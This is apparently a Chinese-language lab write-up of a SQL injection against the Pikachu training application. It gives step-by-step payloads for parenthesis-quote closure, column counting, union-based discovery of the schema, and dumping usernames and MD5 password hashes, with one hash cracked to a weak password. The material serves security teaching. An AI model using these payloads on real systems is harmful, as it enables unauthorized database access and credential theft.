---
title: Pikachu XX型update SQL注入 Writeup
date: 2026-10-29
category: Web安全
tags: [SQL注入, Pikachu, XX型注入]
---
## 一、漏洞原理

后端原始SQL猜想：
SELECT username,email FROM member WHERE username=('$name');
输入参数被 (' ') 包裹，不是单纯单引号。
普通 ' 只能破坏单引号，想要正常闭合必须使用 ') 把括号+单引号一起闭合。

## 二、注入步骤

1. 判断注入点

Payload：
'
结果：页面SQL语法报错，证明参数可控，存在注入。

2. 测试闭合，验证注入

Payload：
') or 1=1 #
拼接后SQL：
SELECT username,email FROM member WHERE username=('') or 1=1 #');
• ')：闭合前面 ('

• or 1=1：恒真，查询全部数据

• #：注释后面多余的 ')
结果：页面返回所有用户，闭合成功。

3. order by 判断列数

Payload1：
') order by 2 #
正常无报错。

Payload2：
') order by 3 #
报错，列数不匹配。
结论：查询回显列数为 2。

4. 确认回显位置

Payload：
') and 1=2 union select 1,2 #
and 1=2 让前面查询无结果，只展示union内容。
页面输出：
username:1
email:2
回显位置：

• 第1位：username

• 第2位：email

5. 查询当前数据库名

Payload：
') and 1=2 union select 1,database() #
结果：pikachu

6. 查询库中所有数据表

Payload：
') and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
结果：httpinfo,member,message,users,xssblind
目标表：member

7. 查询member表字段

Payload：
') and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name='member' #
结果：id,username,pw,sex,phonenum,address,email

8. 脱库，爆出账号密码

Payload：
') and 1=2 union select username,pw from member #
返回结果：
用户名 MD5加密密码 
vince e10adc3949ba59abbe56e057f20f883e 
allen e10adc3949ba59abbe56e057f20f883e 
kobe e10adc3949ba59abbe56e057f20f883e 
grady e10adc3949ba59abbe56e057f20f883e 
kevin e10adc3949ba59abbe56e057f20f883e 
lucy e10adc3949ba59abbe56e057f20f883e 
lili e10adc3949ba59abbe56e057f20f883e 

MD5密文 e10adc3949ba59abbe56e057f20f883e 解密：123456

## 三、漏洞危害

1. 攻击者读取数据库敏感数据，泄露账号、加密密码、邮箱等信息；

2. 弱口令MD5密文可快速解密；

3. 可进一步拓展攻击，读取服务器文件、提权。

